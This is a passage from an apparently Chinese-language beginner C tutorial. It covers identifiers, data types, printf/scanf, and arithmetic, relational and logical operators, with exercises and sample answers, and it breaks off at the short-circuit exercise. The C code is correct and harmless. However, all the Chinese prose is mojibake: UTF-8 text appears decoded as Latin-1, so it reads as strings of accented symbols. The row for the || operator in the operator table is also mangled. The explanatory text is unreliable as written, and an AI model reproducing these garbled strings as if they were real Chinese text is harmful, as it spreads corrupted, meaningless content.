<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ˜“é”™ï¼š</strong> </p>
<ol>
<li><p>ä¸»å‡½æ•°æœ€åè¦åŠ ä¸Š<code>return 0;</code></p>
</li>
<li><p>è¾“å‡ºè¯­å¥å’Œè¿”å›è¯­å¥åé¢çš„åˆ†å·<code>;</code>ä¸èƒ½å°‘</p>
</li>
</ol>
<hr>
<h2 id="2-æ ‡è¯†ç¬¦ä¸å‘½åè§„åˆ™"><a href="#2-æ ‡è¯†ç¬¦ä¸å‘½åè§„åˆ™" class="headerlink" title="2. æ ‡è¯†ç¬¦ä¸å‘½åè§„åˆ™"></a>2. æ ‡è¯†ç¬¦ä¸å‘½åè§„åˆ™</h2><p>åœ¨å®šä¹‰å˜é‡ï¼ˆå¦‚ <code>score</code>, <code>weight</code>ï¼‰æ—¶ï¼Œåå­—ä¸èƒ½éšä¾¿èµ·ã€‚</p>
<ol>
<li><p><strong>ç»„æˆ</strong>ï¼šåªèƒ½åŒ…å«<strong>å­—æ¯</strong> (A-Z, a-z)ã€<strong>æ•°å­—</strong> (0-9)ã€<strong>ä¸‹åˆ’çº¿</strong> (<code>_</code>)ã€‚</p>
</li>
<li><p><strong>ç¦å¿Œ</strong>ï¼š<strong>ä¸èƒ½ä»¥æ•°å­—å¼€å¤´</strong>ï¼ˆå¦‚ <code>1st</code> æ˜¯é”™çš„ï¼‰ã€‚</p>
</li>
<li><p><strong>é¿é›·</strong>ï¼šä¸èƒ½æ˜¯<strong>å…³é”®å­—</strong>ï¼ˆå¦‚ <code>int</code>, <code>return</code>, <code>if</code> ç­‰ï¼‰ã€‚</p>
</li>
</ol>
<hr>
<h3 id="ä¹ é¢˜-2-å¯¹åº”ï¼šæ ‡è¯†ç¬¦ä¸å‘½åè§„åˆ™"><a href="#ä¹ é¢˜-2-å¯¹åº”ï¼šæ ‡è¯†ç¬¦ä¸å‘½åè§„åˆ™" class="headerlink" title="ä¹ é¢˜ 2 (å¯¹åº”ï¼šæ ‡è¯†ç¬¦ä¸å‘½åè§„åˆ™)"></a><strong>ä¹ é¢˜ 2 (å¯¹åº”ï¼šæ ‡è¯†ç¬¦ä¸å‘½åè§„åˆ™)</strong></h3><p><strong>é¢˜ç›®ï¼š</strong> åˆ¤æ–­ä¸‹åˆ—å˜é‡åæ˜¯å¦åˆæ³•ã€‚å¾…åˆ¤æ–­å˜é‡åï¼š</p>
<ol>
<li><p><code>2nd_score</code></p>
</li>
<li><p><code>total_sum</code></p>
</li>
<li><p><code>float</code></p>
</li>
<li><p><code>_user_id</code></p>
</li>
</ol>
<p><strong>è¦æ±‚ï¼š</strong> å°†åˆæ³•çš„å˜é‡å†™å‡ºæ¥ã€‚</p>
<p><strong>ç­”æ¡ˆï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 2nd_score</span><br><span class="line">   é”™è¯¯ï¼Œä¸èƒ½ä»¥æ•°å­—å¼€å¤´</span><br><span class="line">2. total_sum</span><br><span class="line">   æ­£ç¡®</span><br><span class="line">3. float</span><br><span class="line">   é”™è¯¯ï¼Œæ˜¯å…³é”®å­—</span><br><span class="line">4. _user_id</span><br><span class="line">   æ­£ç¡® </span><br></pre></td></tr></table></figure>

<p><strong>æ˜“é”™ï¼š</strong></p>
<ol>
<li><p>å˜é‡åä¸èƒ½åŒ…å«å‡å· <code>-</code> (å¦‚ <code>total-sum</code> æ˜¯é”™çš„)ã€‚</p>
</li>
<li><p>å³ä½¿æ˜¯ä»¥ <code>_</code> å¼€å¤´ä¹Ÿæ˜¯åˆæ³•çš„ï¼Œä½†ä¸èƒ½ä»¥æ•°å­—å¼€å¤´ã€‚</p>
</li>
</ol>
<hr>
<h2 id="3-åŸºæœ¬æ•°æ®ç±»å‹"><a href="#3-åŸºæœ¬æ•°æ®ç±»å‹" class="headerlink" title="3. åŸºæœ¬æ•°æ®ç±»å‹"></a>3. åŸºæœ¬æ•°æ®ç±»å‹</h2><p>æ•°æ®ç±»å‹å†³å®šäº†å˜é‡å­˜å‚¨çš„æ•°æ®ç§ç±»å’Œå ç”¨çš„å†…å­˜ç©ºé—´å¤§å°ã€‚</p>
<table>
<thead>
<tr>
<th><strong>ç±»å‹ (Type)</strong></th>
<th><strong>å­˜å‚¨å†…å®¹</strong></th>
<th><strong>å…¸å‹å¤§å°</strong></th>
<th><strong>æ ¼å¼æ§åˆ¶ç¬¦</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>int</code></strong></td>
<td>æ•´æ•° (Integer)</td>
<td>4 å­—èŠ‚</td>
<td><code>%d</code></td>
</tr>
<tr>
<td><strong><code>float</code></strong></td>
<td>å•ç²¾åº¦æµ®ç‚¹æ•° (å°æ•°)</td>
<td>4 å­—èŠ‚</td>
<td><code>%f</code></td>
</tr>
<tr>
<td><strong><code>double</code></strong></td>
<td>åŒç²¾åº¦æµ®ç‚¹æ•° (æ›´ç²¾ç¡®çš„å°æ•°)</td>
<td>8 å­—èŠ‚</td>
<td><code>%lf</code></td>
</tr>
<tr>
<td><strong><code>char</code></strong></td>
<td>å­—ç¬¦ (Character)</td>
<td>1 å­—èŠ‚</td>
<td><code>%c</code></td>
</tr>
</tbody></table>
<p><strong>è¡¥å……è€ƒç‚¹ï¼š</strong></p>
<ul>
<li><p><strong><code>sizeof</code> è¿ç®—ç¬¦</strong>ï¼šç”¨äºè®¡ç®—ç±»å‹å¤§å°ã€‚ä¾‹å¦‚ <code>sizeof(int)</code> ç­‰äº 4ã€‚</p>
</li>
<li><p><strong>å˜é‡å®šä¹‰</strong>ï¼šåœ¨ä½¿ç”¨ä»»ä½•å˜é‡å‰ï¼Œå¿…é¡»å…ˆå®šä¹‰å®ƒã€‚ä¾‹å¦‚ï¼š<code>int score;</code> æˆ– <code>float price = 10.5;</code></p>
</li>
</ul>
<hr>
<h3 id="ä¹ é¢˜-3-å¯¹åº”ï¼šåŸºæœ¬æ•°æ®ç±»å‹"><a href="#ä¹ é¢˜-3-å¯¹åº”ï¼šåŸºæœ¬æ•°æ®ç±»å‹" class="headerlink" title="ä¹ é¢˜ 3 (å¯¹åº”ï¼šåŸºæœ¬æ•°æ®ç±»å‹)"></a><strong>ä¹ é¢˜ 3 (å¯¹åº”ï¼šåŸºæœ¬æ•°æ®ç±»å‹)</strong></h3><p><strong>é¢˜ç›®ï¼š</strong> ç¼–å†™ç¨‹åºï¼Œå®šä¹‰ä»¥ä¸‹ 4 ä¸ªå˜é‡å¹¶èµ‹äºˆåˆå§‹å€¼ï¼š</p>
<ol>
<li><p>æ•´å‹ <code>age</code> &#x3D; 18</p>
</li>
<li><p>å•ç²¾åº¦æµ®ç‚¹ <code>height</code> &#x3D; 175.5</p>
</li>
<li><p>åŒç²¾åº¦æµ®ç‚¹ <code>pi</code> &#x3D; 3.1415926</p>
</li>
<li><p>å­—ç¬¦å‹ <code>level</code> &#x3D; â€˜Aâ€™ç„¶åå°†å®ƒä»¬ä¾æ¬¡æ‰“å°å‡ºæ¥ï¼ˆä¸­é—´ç”¨ç©ºæ ¼éš”å¼€ï¼‰ã€‚</p>
</li>
</ol>
<p><strong>è¦æ±‚ï¼š</strong> å¿…é¡»ä½¿ç”¨æ­£ç¡®çš„æ•°æ®ç±»å‹å…³é”®å­—å’Œå¯¹åº”çš„æ ¼å¼æ§åˆ¶ç¬¦ã€‚</p>
<p><strong>é¢„æœŸè¾“å‡ºç»“æœï¼š</strong></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">18 175.500000 3.141593 A</span><br></pre></td></tr></table></figure>

<p><strong>ç­”æ¡ˆï¼š</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> age = <span class="number">18</span>;</span><br><span class="line">    <span class="type">float</span> height = <span class="number">175.5</span>;</span><br><span class="line">    <span class="type">double</span> pi = <span class="number">3.1415926</span>;</span><br><span class="line">    <span class="type">char</span> level = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// %.6lf æ˜¯é»˜è®¤ç²¾åº¦ï¼Œé¢˜ç›®æœªè¦æ±‚ç²¾åº¦æ§åˆ¶ï¼Œé»˜è®¤å³å¯</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %f %lf %c\n&quot;</span>, age, height, pi, level);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ˜“é”™ï¼š</strong></p>
<ol>
<li><p>å­—ç¬¦å¸¸é‡å¿…é¡»ç”¨å•å¼•å· <code>&#39; &#39;</code>ï¼Œä¸èƒ½ç”¨åŒå¼•å·ã€‚</p>
</li>
<li><p>å®šä¹‰å˜é‡æ—¶å¿˜è®°åˆå§‹åŒ–ï¼ˆè™½ä¸æŠ¥é”™ï¼Œä½†æ‰“å°å‡ºæ¥æ˜¯ä¹±ç ï¼‰ã€‚</p>
</li>
</ol>
<hr>
<h2 id="4-æ ¸å¿ƒ-I-O-å‡½æ•°-è¾“å…¥-è¾“å‡º"><a href="#4-æ ¸å¿ƒ-I-O-å‡½æ•°-è¾“å…¥-è¾“å‡º" class="headerlink" title="4. æ ¸å¿ƒ I&#x2F;O å‡½æ•° (è¾“å…¥&#x2F;è¾“å‡º)"></a>4. æ ¸å¿ƒ I&#x2F;O å‡½æ•° (è¾“å…¥&#x2F;è¾“å‡º)</h2><table>
<thead>
<tr>
<th><strong>å‡½æ•°</strong></th>
<th><strong>ä½œç”¨</strong></th>
<th><strong>æ ¼å¼æ§åˆ¶ç¬¦</strong></th>
<th><strong>ç¤ºä¾‹</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>printf()</code></strong></td>
<td><strong>è¾“å‡º</strong>æ•°æ®åˆ°å±å¹•ã€‚</td>
<td><code>%d</code> (æ•´æ•°), <code>%f</code> (æµ®ç‚¹æ•°), <code>%c</code> (å­—ç¬¦), <code>%s</code> (å­—ç¬¦ä¸²)</td>
<td><code>printf(&quot;Age: %d&quot;, age);</code></td>
</tr>
<tr>
<td><strong><code>scanf()</code></strong></td>
<td><strong>æ¥æ”¶</strong>ç”¨æˆ·ä»é”®ç›˜çš„è¾“å…¥ã€‚</td>
<td><code>%d</code>, <code>%f</code>, <code>%c</code>, <code>%s</code></td>
<td><code>scanf(&quot;%d&quot;, &amp;age);</code></td>
</tr>
</tbody></table>
<p><strong>é‡ç‚¹æé†’ ï¼š</strong> ä½¿ç”¨ <code>scanf</code> è¯»å–å˜é‡æ—¶ï¼Œé™¤äº†å­—ç¬¦ä¸²ä¹‹å¤–ï¼Œ<strong>å˜é‡åå‰é¢å¿…é¡»åŠ  <code>&amp;</code> ç¬¦å·</strong>ï¼ˆå–åœ°å€ç¬¦ï¼‰ã€‚è¿™æ˜¯ C è¯­è¨€ä¸­ä¼ å€è°ƒç”¨çš„åŸºç¡€ã€‚ï¼Œ</p>
<p><strong>è¡¥å……ç»†èŠ‚ï¼š</strong></p>
<ul>
<li><p><strong><code>double</code> çš„è¯»å†™</strong>ï¼š</p>
<ul>
<li><p><code>printf</code> è¾“å‡ºæ—¶å¯ä»¥ç”¨ <code>%f</code> æˆ– <code>%lf</code>ã€‚</p>
</li>
<li><p><code>scanf</code> <strong>è¾“å…¥æ—¶å¿…é¡»ç”¨ <code>%lf</code></strong>ï¼Œå¦åˆ™æ•°æ®ä¼šå‡ºé”™ã€‚</p>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="é¢˜-4-å¯¹åº”ï¼šæ ¸å¿ƒ-I-O-å‡½æ•°"><a href="#é¢˜-4-å¯¹åº”ï¼šæ ¸å¿ƒ-I-O-å‡½æ•°" class="headerlink" title="é¢˜ 4 (å¯¹åº”ï¼šæ ¸å¿ƒ I&#x2F;O å‡½æ•°)"></a><strong>é¢˜ 4 (å¯¹åº”ï¼šæ ¸å¿ƒ I&#x2F;O å‡½æ•°)</strong></h3><p><strong>é¢˜ç›®ï¼š</strong> ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œè¦æ±‚ç”¨æˆ·è¾“å…¥ä»–çš„<strong>å­¦å· (æ•´æ•°)</strong> å’Œ <strong>ä½“é‡ (æµ®ç‚¹æ•°)</strong>ï¼Œç„¶åç¨‹åºå°†è¿™ä¸¤é¡¹ä¿¡æ¯æ‰“å°å‡ºæ¥ã€‚</p>
<p><strong>è¦æ±‚ï¼š</strong></p>
<ol>
<li><p>å­¦å·ä½¿ç”¨ <code>int</code> ç±»å‹ï¼Œä½“é‡ä½¿ç”¨ <code>double</code> ç±»å‹ã€‚</p>
</li>
<li><p>ä½¿ç”¨ <code>scanf</code> è·å–è¾“å…¥ï¼Œä½¿ç”¨ <code>printf</code> æ‰“å°è¾“å‡ºã€‚</p>
</li>
<li><p>è¾“å‡ºä½“é‡æ—¶ï¼Œè¦æ±‚<strong>ä¿ç•™ä¸¤ä½å°æ•°</strong>ã€‚</p>
</li>
</ol>
<p><strong>é¢„æœŸè¾“å‡ºç»“æœï¼š</strong></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">è¯·è¾“å…¥ä½ çš„å­¦å·: </span><br><span class="line">20251101</span><br><span class="line">è¯·è¾“å…¥ä½ çš„ä½“é‡ (kg): </span><br><span class="line">72.5</span><br><span class="line">---ä½ çš„ä¿¡æ¯æ˜¯---</span><br><span class="line">å­¦å·: 20251101</span><br><span class="line">ä½“é‡: 72.50 kg</span><br></pre></td></tr></table></figure>

<p><strong>ç­”æ¡ˆï¼š</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">double</span> weight;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä½ çš„å­¦å·: \n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;id);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä½ çš„ä½“é‡ (kg): \n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;weight); <span class="comment">// é‡ç‚¹ï¼šdouble è¾“å…¥å¿…é¡»ç”¨ %lf</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---ä½ çš„ä¿¡æ¯æ˜¯---\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;å­¦å·: %d\n&quot;</span>, id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ä½“é‡: %.2lf kg\n&quot;</span>, weight); <span class="comment">// é‡ç‚¹ï¼šä¿ç•™ä¸¤ä½å°æ•°ç”¨ %.2lf</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ˜“é”™ï¼š</strong></p>
<ol>
<li><p><code>scanf</code> ä¸­å˜é‡åå‰å¿˜è®°åŠ  <code>&amp;</code>ã€‚</p>
</li>
<li><p><code>scanf</code> è¯»å– <code>double</code> æ—¶é”™è¯¯ä½¿ç”¨äº† <code>%f</code>ï¼ˆä¼šå¯¼è‡´æ•°æ®å…¨éƒ¨è¯»é”™ï¼‰ã€‚</p>
</li>
</ol>
<hr>
<h2 id="5-è¿ç®—ç¬¦"><a href="#5-è¿ç®—ç¬¦" class="headerlink" title="5. è¿ç®—ç¬¦"></a>5. è¿ç®—ç¬¦</h2><h3 id="5-1-ç®—æœ¯è¿ç®—ç¬¦"><a href="#5-1-ç®—æœ¯è¿ç®—ç¬¦" class="headerlink" title="5.1 ç®—æœ¯è¿ç®—ç¬¦"></a>5.1 ç®—æœ¯è¿ç®—ç¬¦</h3><p>ç”¨äºæ•°å­¦è®¡ç®—ã€‚</p>
<table>
<thead>
<tr>
<th><strong>è¿ç®—ç¬¦</strong></th>
<th><strong>æè¿°</strong></th>
<th><strong>ç¤ºä¾‹</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>+</code></td>
<td>åŠ </td>
<td><code>a + b</code></td>
</tr>
<tr>
<td><code>-</code></td>
<td>å‡</td>
<td><code>a - b</code></td>
</tr>
<tr>
<td><code>*</code></td>
<td>ä¹˜</td>
<td><code>a * b</code></td>
</tr>
<tr>
<td><code>/</code></td>
<td><strong>é™¤</strong></td>
<td><code>a / b</code></td>
</tr>
<tr>
<td><code>%</code></td>
<td><strong>å–ä½™</strong> (æ¨¡è¿ç®—)</td>
<td><code>a % b</code> (åªèƒ½ç”¨äºæ•´æ•°)</td>
</tr>
</tbody></table>
<p>é‡ç‚¹é™·é˜±ï¼š</p>
<p>C è¯­è¨€ä¸­çš„æ•´æ•°é™¤æ³• (int &#x2F; int) ç»“æœä»ç„¶æ˜¯æ•´æ•°ï¼Œä¼šèˆå¼ƒå°æ•°éƒ¨åˆ†ã€‚</p>
<ul>
<li><p>ä¾‹å¦‚ï¼š<code>int result = 10 / 3;</code> $\Rightarrow$ <code>result</code> æ˜¯ $3$ è€Œä¸æ˜¯ $3.333$ã€‚</p>
</li>
<li><p>è‹¥æƒ³å¾—åˆ°æµ®ç‚¹ç»“æœï¼Œè‡³å°‘ä¸€ä¸ªæ“ä½œæ•°å¿…é¡»æ˜¯æµ®ç‚¹ç±»å‹ï¼š<code>10.0 / 3</code> æˆ– <code>(float)10 / 3</code>ã€‚</p>
</li>
</ul>
<h3 id="5-2-å…³ç³»è¿ç®—ç¬¦"><a href="#5-2-å…³ç³»è¿ç®—ç¬¦" class="headerlink" title="5.2 å…³ç³»è¿ç®—ç¬¦"></a>5.2 å…³ç³»è¿ç®—ç¬¦</h3><p>ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼ï¼Œç»“æœæ˜¯ <strong>çœŸ (1)</strong> æˆ– <strong>å‡ (0)</strong>ã€‚</p>
<table>
<thead>
<tr>
<th><strong>è¿ç®—ç¬¦</strong></th>
<th><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>&gt;</code></td>
<td>å¤§äº</td>
</tr>
<tr>
<td><code>&lt;</code></td>
<td>å°äº</td>
</tr>
<tr>
<td><code>&gt;=</code></td>
<td>å¤§äºç­‰äº</td>
</tr>
<tr>
<td><code>&lt;=</code></td>
<td>å°äºç­‰äº</td>
</tr>
<tr>
<td><code>==</code></td>
<td><strong>ç­‰äº</strong> (æ³¨æ„æ˜¯ä¸¤ä¸ªç­‰å·ï¼)</td>
</tr>
<tr>
<td><code>!=</code></td>
<td>ä¸ç­‰äº</td>
</tr>
</tbody></table>
<h3 id="5-3-é€»è¾‘è¿ç®—ç¬¦"><a href="#5-3-é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="5.3 é€»è¾‘è¿ç®—ç¬¦"></a>5.3 é€»è¾‘è¿ç®—ç¬¦</h3><p>ç”¨äºç»„åˆå¤šä¸ªå…³ç³»è¡¨è¾¾å¼ã€‚</p>
<table>
<thead>
<tr>
<th><strong>è¿ç®—ç¬¦</strong></th>
<th><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>&amp;&amp;</code></td>
<td><strong>é€»è¾‘ä¸ (AND)</strong>ï¼šä¸¤è¾¹éƒ½ä¸ºçœŸæ‰ä¸ºçœŸã€‚</td>
</tr>
<tr>
<td>&#96;|</td>
<td>&#96;</td>
</tr>
<tr>
<td><code>!</code></td>
<td><strong>é€»è¾‘é (NOT)</strong>ï¼šå–åã€‚</td>
</tr>
</tbody></table>
<p><strong>è¡¥å……è€ƒç‚¹ (é€»è¾‘çŸ­è·¯)ï¼š</strong></p>
<ul>
<li><p>å¯¹äº <code>&amp;&amp;</code>ï¼šå¦‚æœå·¦è¾¹æ˜¯å‡ (0)ï¼Œå³è¾¹<strong>ä¸ä¼šæ‰§è¡Œ</strong>ã€‚</p>
</li>
<li><p>å¯¹äº <code>||</code>ï¼šå¦‚æœå·¦è¾¹æ˜¯çœŸ (é0)ï¼Œå³è¾¹<strong>ä¸ä¼šæ‰§è¡Œ</strong>ã€‚</p>
</li>
</ul>
<hr>
<h3 id="ä¹ é¢˜-5-1-å¯¹åº”ï¼šç®—æœ¯è¿ç®—ç¬¦"><a href="#ä¹ é¢˜-5-1-å¯¹åº”ï¼šç®—æœ¯è¿ç®—ç¬¦" class="headerlink" title="ä¹ é¢˜ 5.1 (å¯¹åº”ï¼šç®—æœ¯è¿ç®—ç¬¦)"></a><strong>ä¹ é¢˜ 5.1 (å¯¹åº”ï¼šç®—æœ¯è¿ç®—ç¬¦)</strong></h3><p><strong>é¢˜ç›®ï¼š</strong> è®¡ç®— 10 å’Œ 3 çš„<strong>å’Œã€å·®ã€ç§¯</strong>ï¼Œä»¥åŠ 10 é™¤ä»¥ 3 çš„<strong>æ•´æ•°å•†</strong>å’Œ<strong>æµ®ç‚¹æ•°å•†</strong>ã€‚</p>
<p><strong>è¦æ±‚ï¼š</strong></p>
<ol>
<li><p>å¿…é¡»ä½¿ç”¨ <code>int</code>, <code>float</code> æˆ– <code>double</code> è‡³å°‘ä¸‰ç§æ•°æ®ç±»å‹ã€‚</p>
</li>
<li><p>é‡ç‚¹å±•ç¤º<strong>æ•´æ•°é™¤æ³•</strong>å’Œ<strong>æµ®ç‚¹æ•°é™¤æ³•</strong>çš„åŒºåˆ«ã€‚</p>
</li>
</ol>
<p><strong>é¢„æœŸè¾“å‡ºç»“æœï¼š</strong></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">10 + 3 = 13</span><br><span class="line">10 - 3 = 7</span><br><span class="line">10 * 3 = 30</span><br><span class="line">10 / 3 çš„æ•´æ•°å•†æ˜¯ï¼š3</span><br><span class="line">10 / 3 çš„æµ®ç‚¹æ•°å•†æ˜¯ï¼š3.333333</span><br></pre></td></tr></table></figure>

<p><strong>ç­”æ¡ˆï¼š</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>, b = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sum = a + b;</span><br><span class="line">    <span class="type">int</span> diff = a - b;</span><br><span class="line">    <span class="type">int</span> product = a * b;</span><br><span class="line">    <span class="type">int</span> int_div = a / b;         <span class="comment">// æ•´æ•°é™¤æ³•</span></span><br><span class="line">    <span class="type">double</span> float_div = (<span class="type">double</span>)a / b; <span class="comment">// æµ®ç‚¹é™¤æ³•ï¼ˆå¼ºåˆ¶è½¬æ¢ï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;10 + 3 = %d\n&quot;</span>, sum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;10 - 3 = %d\n&quot;</span>, diff);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;10 * 3 = %d\n&quot;</span>, product);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;10 / 3 çš„æ•´æ•°å•†æ˜¯ï¼š%d\n&quot;</span>, int_div);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;10 / 3 çš„æµ®ç‚¹æ•°å•†æ˜¯ï¼š%lf\n&quot;</span>, float_div);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ˜“é”™ï¼š</strong></p>
<ol>
<li><p>æ•´æ•°é™¤ä»¥æ•´æ•° (<code>10/3</code>) ç»“æœä¼šç›´æ¥æˆªæ–­å°æ•°éƒ¨åˆ†å˜æˆ <code>3</code>ã€‚</p>
</li>
<li><p>æƒ³è¦å¾—åˆ°å°æ•°ï¼Œå¿…é¡»è®©é™¤å·ä¸¤è¾¹è‡³å°‘æœ‰ä¸€ä¸ªæ˜¯æµ®ç‚¹æ•°ã€‚</p>
</li>
</ol>
<hr>
<h3 id="ä¹ é¢˜-5-2-å¯¹åº”ï¼šå…³ç³»è¿ç®—ç¬¦"><a href="#ä¹ é¢˜-5-2-å¯¹åº”ï¼šå…³ç³»è¿ç®—ç¬¦" class="headerlink" title="ä¹ é¢˜ 5.2 (å¯¹åº”ï¼šå…³ç³»è¿ç®—ç¬¦)"></a><strong>ä¹ é¢˜ 5.2 (å¯¹åº”ï¼šå…³ç³»è¿ç®—ç¬¦)</strong></h3><p><strong>é¢˜ç›®ï¼š</strong> å®šä¹‰ä¸¤ä¸ªæ•´æ•° <code>a = 5</code> å’Œ <code>b = 3</code>ã€‚è¯·åˆ†åˆ«æ‰“å° <code>a &gt; b</code>, <code>a &lt; b</code>, <code>a == b</code> çš„è¿ç®—ç»“æœã€‚</p>
<p><strong>è¦æ±‚ï¼š</strong> ç†è§£å…³ç³»è¿ç®—çš„ç»“æœæœ¬è´¨ä¸Šæ˜¯æ•´æ•° 1 (çœŸ) æˆ– 0 (å‡)ã€‚</p>
<p><strong>é¢„æœŸè¾“å‡ºç»“æœï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 &gt; 3 çš„ç»“æœæ˜¯: 1</span><br><span class="line">5 &lt; 3 çš„ç»“æœæ˜¯: 0</span><br><span class="line">5 == 3 çš„ç»“æœæ˜¯: 0</span><br></pre></td></tr></table></figure>

<p><strong>ç­”æ¡ˆï¼š</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">5</span>, b = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;5 &gt; 3 çš„ç»“æœæ˜¯: %d\n&quot;</span>, a &gt; b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;5 &lt; 3 çš„ç»“æœæ˜¯: %d\n&quot;</span>, a &lt; b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;5 == 3 çš„ç»“æœæ˜¯: %d\n&quot;</span>, a == b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ˜“é”™ï¼š</strong></p>
<ol>
<li><p>åˆ¤æ–­ç›¸ç­‰å¿…é¡»ç”¨åŒç­‰å· <code>==</code>ï¼Œå•ç­‰å· <code>=</code> æ˜¯èµ‹å€¼ã€‚</p>
</li>
<li><p>å…³ç³»è¡¨è¾¾å¼çš„ç»“æœåªæœ‰ 0 å’Œ 1ï¼Œä¸ä¼šè¾“å‡º â€œTrueâ€ æˆ– â€œFalseâ€ã€‚</p>
</li>
</ol>
<hr>
<h3 id="ä¹ é¢˜-5-3-å¯¹åº”ï¼šé€»è¾‘è¿ç®—ç¬¦"><a href="#ä¹ é¢˜-5-3-å¯¹åº”ï¼šé€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="ä¹ é¢˜ 5.3 (å¯¹åº”ï¼šé€»è¾‘è¿ç®—ç¬¦)"></a><strong>ä¹ é¢˜ 5.3 (å¯¹åº”ï¼šé€»è¾‘è¿ç®—ç¬¦)</strong></h3><p><strong>é¢˜ç›®ï¼š</strong> éªŒè¯é€»è¾‘è¿ç®—çš„â€œçŸ­è·¯â€ç°è±¡ã€‚å®šä¹‰ <code>int a = 0</code> å’Œ <code>int b = 10</code>ã€‚æ‰§è¡Œè¡¨è¾¾å¼ <code>(a != 0) &amp;&amp; (b++ &gt; 10)</code> åï¼Œæ‰“å° <code>b</code> çš„å€¼ã€‚</p>
<p><strong>è¦æ±‚ï¼š</strong> è§£é‡Šä¸ºä»€ä¹ˆ <code>b</code> çš„å€¼æ²¡æœ‰å‘ç”Ÿå˜åŒ–ã€‚</p>
<p><strong>é¢„æœŸè¾“å‡ºç»“æœï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‰§è¡Œå b çš„å€¼: 10</span><br></pre></td></tr></table></figure>

<p><strong>ç­”æ¡ˆï¼š</strong></p>
